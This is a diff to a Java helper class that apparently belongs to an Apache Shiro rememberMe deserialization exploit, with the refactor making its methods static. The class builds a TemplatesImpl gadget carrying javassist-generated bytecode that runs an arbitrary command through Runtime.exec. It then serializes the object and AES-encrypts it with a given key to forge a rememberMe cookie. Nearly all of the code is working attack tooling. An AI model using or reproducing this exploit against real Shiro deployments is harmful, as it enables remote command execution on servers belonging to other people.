@@ -9,7 +9,6 @@ import javassist.CtClass;
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.util.ByteSource;
 import sun.misc.BASE64Decoder;
-import sun.misc.BASE64Encoder;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
@@ -18,7 +17,7 @@ import java.lang.reflect.Field;
 import java.util.Random;
 
 public class Util {
-    public byte[] serialize(Object object) {
+    public static byte[] serialize(Object object) {
         try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
              ObjectOutputStream oos = new ObjectOutputStream(bos)
         ) {
@@ -36,7 +35,7 @@ public class Util {
 //        return payload.replace("\n\n", "");
 //    }
 
-    public String getRememberMe(byte[] bytes, String key) {
+    public static String getRememberMe(byte[] bytes, String key) {
         try {
             byte[] AES_KEY = new BASE64Decoder().decodeBuffer(key);
             AesCipherService aesCipherService = new AesCipherService();
@@ -48,7 +47,7 @@ public class Util {
         return "";
     }
 
-    public void setFieldValue(Object obj, String field, Object value) {
+    public static void setFieldValue(Object obj, String field, Object value) {
         try {
             Class<?> clazz = Class.forName(obj.getClass().getName());
             Field field1 = clazz.getDeclaredField(field);
@@ -59,9 +58,9 @@ public class Util {
         }
     }
 
-    public TemplatesImpl createTemplates(String command) {
+    public static TemplatesImpl createTemplates(String command) {
         ClassPool pool = ClassPool.getDefault();
-        CtClass ctClass = pool.makeClass("Foo" + new Random().nextInt(10));
+        CtClass ctClass = pool.makeClass("Foo" + new Random().nextInt(20));
         String commandTemplate = "java.lang.Runtime.getRuntime().exec(\"%s\");";
         byte[] bytes = new byte[1024];
         try {
@@ -73,9 +72,9 @@ public class Util {
             e.printStackTrace();
         }
         TemplatesImpl templates = new TemplatesImpl();
-        this.setFieldValue(templates, "_name", "foo");
-        this.setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
-        this.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
+        setFieldValue(templates, "_name", "foo");
+        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
+        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
         return templates;
     }
 }
